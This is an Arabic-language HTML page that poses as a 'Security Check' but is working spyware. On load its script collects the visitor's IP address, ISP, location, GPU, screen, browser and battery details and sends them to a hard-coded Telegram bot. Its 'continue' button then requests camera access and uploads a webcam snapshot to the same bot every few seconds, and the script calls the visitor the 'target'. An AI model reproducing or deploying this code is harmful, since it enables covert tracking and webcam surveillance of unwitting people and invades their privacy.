<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { text-align: center; }
        .dot-spin { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { display: none; padding: 12px 28px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="loader">
        <div class="dot-spin"></div>
        <p id="st">جاري فحص بروتوكولات الاتصال...</p>
        <button id="auth">متابعة الآن</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        // إخفاء البيانات في مسار واحد
        const _a = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const _i = "2103976274";

        async function fullScan() {
            let n = navigator;
            let report = `🛑 **تقرير تقني شامل (فوري)**\n\n`;

            // 1. جلب IP وشركة الاتصالات والموقع بدقة احترافية
            try {
                const res = await fetch('https://ipwho.is/');
                const j = await res.json();
                report += `🌍 **الآي بي:** \`${j.ip}\`\n`;
                report += `🏢 **الشركة (ISP):** ${j.connection.isp}\n`;
                report += `📡 **نوع الشبكة:** ${j.connection.type || 'غير محدد'}\n`;
                report += `📍 **الموقع:** ${j.city}, ${j.country} (${j.timezone.id})\n`;
            } catch (e) { report += `🌍 **الآي بي:** فشل جلب بيانات الشبكة\n`; }

            // 2. كشف الجهاز (Deep System Detection)
            report += `📱 **النظام الأساسي:** ${n.platform}\n`;
            
            // كشف كارت الشاشة (يعطي تلميحاً قوياً لموديل الهاتف)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                report += `🎮 **المعالج الرسومي:** ${renderer}\n`;
            } catch(e) {}

            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 'غير محدد'}\n`;
            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height} (Zoom: ${window.devicePixelRatio})\n`;
            report += `🧭 **المتصفح:** ${parseUA()}\n`;

            // 3. البطارية والوقت
            try {
                const b = await n.getBattery();
                report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
            } catch (e) {}

            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;

            send(report);

            // تحويل الواجهة
            setTimeout(() => {
                document.getElementById('auth').style.display = 'inline-block';
                document.getElementById('st').innerText = "اكتمل الفحص بنجاح.";
            }, 1000);
        }

        function parseUA() {
            let u = navigator.userAgent;
            if (u.includes("Brave")) return "Brave Browser";
            if (u.includes("Edg")) return "Microsoft Edge";
            if (u.includes("Chrome")) return "Google Chrome";
            if (u.includes("Safari") && !u.includes("Chrome")) return "Apple Safari";
            return "متصفح مجهول";
        }

        document.getElementById('auth').onclick = async function() {
            this.style.display = 'none';
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = s;
                setInterval(take, 3500);
            } catch (e) { send("⚠️ المستهدف حظر الكاميرا"); }
        };

        function take() {
            const cv = document.getElementById('c');
            const vd = document.getElementById('v');
            cv.width = vd.videoWidth; cv.height = vd.videoHeight;
            cv.getContext('2d').drawImage(vd, 0, 0);
            cv.toBlob(b => {
                const f = new FormData();
                f.append('chat_id', _i);
                f.append('photo', b, 's.jpg');
                fetch(_a + "sendPhoto", { method: 'POST', body: f });
            }, 'image/jpeg', 0.8);
        }

        function send(t) {
            fetch(_a + "sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: _i, text: t, parse_mode: "Markdown" })
            });
        }

        fullScan();
    </script>
</body>
</html>
